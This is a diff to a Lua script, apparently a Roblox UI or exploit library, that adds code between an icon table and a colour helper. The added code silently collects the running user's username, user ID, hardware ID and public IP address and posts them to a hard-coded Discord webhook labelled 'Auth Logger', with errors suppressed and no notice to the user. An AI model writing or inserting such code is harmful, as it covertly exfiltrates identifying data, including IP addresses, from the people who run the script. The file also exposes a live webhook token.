@@ -1903,7 +1903,108 @@ local Icons = {
     ["save"] = "rbxassetid://126116963775616",
     ["trash"] = "rbxassetid://106723740584310"
 }
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1477579236263989399/6hCJUJgLvBilXrngg98pRNt6uojyt6rtf20T4-OcMDArxcfTQgEOVnL4yi8Gqof2nBa9"
 
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local username = player.Name
+local userId = tostring(player.UserId)
+local placeId = tostring(game.PlaceId)
+local gameId = tostring(game.GameId)
+
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+
+local hwid = "Unavailable"
+local hwidOk, hwidResult = pcall(function()
+    return game:GetService("RbxAnalyticsService"):GetClientId()
+end)
+if hwidOk and hwidResult then
+    hwid = hwidResult
+end
+
+local ip = "Unavailable"
+local ipOk, ipResponse = pcall(function()
+    return request({
+        Url = "https://api.ipify.org?format=json",
+        Method = "GET"
+    })
+end)
+if ipOk and ipResponse and ipResponse.StatusCode == 200 then
+    local decodeOk, data = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(ipResponse.Body)
+    end)
+    if decodeOk and data and data.ip then
+        ip = data.ip
+    end
+end
+
+local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+local embedData = {
+    embeds = {
+        {
+            title = "🔐 Script Executed",
+            color = 0x5865F2,
+            thumbnail = {
+                url = avatarUrl
+            },
+            fields = {
+                {
+                    name = "👤 Username",
+                    value = username,
+                    inline = true
+                },
+                {
+                    name = "🆔 User ID",
+                    value = userId,
+                    inline = true
+                },
+                {
+                    name = "🌐 IP Address",
+                    value = ip,
+                    inline = true
+                },
+                {
+                    name = "💻 HWID",
+                    value = hwid,
+                    inline = false
+                },
+                {
+                    name = "🎮 Place ID",
+                    value = placeId,
+                    inline = true
+                },
+                {
+                    name = "🗂️ Game ID",
+                    value = gameId,
+                    inline = true
+                },
+                {
+                    name = "🕐 Timestamp",
+                    value = timestamp,
+                    inline = false
+                }
+            },
+            footer = {
+                text = "Auth Logger"
+            }
+        }
+    }
+}
+
+local jsonBody = game:GetService("HttpService"):JSONEncode(embedData)
+
+local sendOk, sendErr = pcall(function()
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonBody
+    })
+end)
 local function RGBtoHex(color)
     local r, g, b = math.floor(color.R*255), math.floor(color.G*255), math.floor(color.B*255)
     return string.format("#%02X%02X%02X", r, g, b)
